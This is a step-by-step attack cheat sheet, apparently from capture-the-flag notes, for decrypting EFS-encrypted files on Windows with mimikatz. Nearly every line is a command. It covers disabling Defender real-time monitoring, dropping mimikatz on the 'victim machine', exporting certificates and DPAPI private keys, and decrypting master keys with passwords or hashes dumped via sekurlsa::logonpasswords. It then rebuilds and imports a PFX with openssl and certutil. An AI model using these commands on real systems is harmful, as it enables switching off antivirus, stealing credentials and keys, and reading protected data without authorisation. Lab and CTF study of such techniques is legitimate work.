## Decrypt EFS encrypted files with mimikatz

## Requirements: System/root level access

### Example: We have a root flag that we can't read even as the SYSTEM user. We do the steps below:

#### 1) cipher /c root.txt (It will show you which users can decrypt the file, as well as the certificate thumbprint to export it to a .der file with mimikatz later)

#### 2) powershell set-mppreference -disablerealtimemonitoring $true (Disable AV to safely download mimikatz to victim machine)

#### 3) Transfer mimikatz.exe to the machine

#### 4) ./mimikatz.exe

#### 5) privilege::debug

#### 6) crypto::system /file:"C:\Users\USER\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\CERTIFICATE_STRING /export (Obtains and exports the public key to a .der file.) 

#### 7) dpapi::capi /in:"C:\Users\USER\AppData\Roaming\Microsoft\Crypto\RSA\USER_SID\RANDOM_NUMBERS" (Verify that the private key is located in this container) Hint: the pUnique name is the same as earlier container name.

#### 8) dpapi::masterkey /in"C:\Users\USER\AppData\Roaming\Microsoft\Protect\USER_SID\ENCRYPTED_MASTERKEY_GUID /password:PASSWORD or /hash:SHA1_HASH HINT: We can also use the SHA1 hash to decrypt the masterkey. We can dump the SHA1 of the user with sekurlsa::logonpasswords command.

#### 9) dpapi::capi /in:"C:\Users\USER\AppData\Roaming\Microsoft\Crypto\RSA\USER_SID\RANDOM_NUMBERS" /masterkey:DECRYPTED_MASTERKEY (Obtains the private key)

#### 10) Transfer the .der  and the .pvk files to attacking machine with the method of your choice

#### 11) Attacking machine: openssl x509 -inform DER -outform PEM -in PUBLIC_KEY.der -out public.pem

#### 12) Attacking machine: openssl rsa -inform PVK -outform PEM -in PRIVATE_KEY.pvk -out private.pem

#### 13) openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx (Generate a certificate .pfx file by using the public and private .pem files we previously generated from the files extracted by mimikatz)

#### 14) Transfer the cert.pfx file to the machine

#### 15) Victim machine: certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot (Import the .pfx certificate.)

#### 16) Now we can finally read the previously encrypted files!
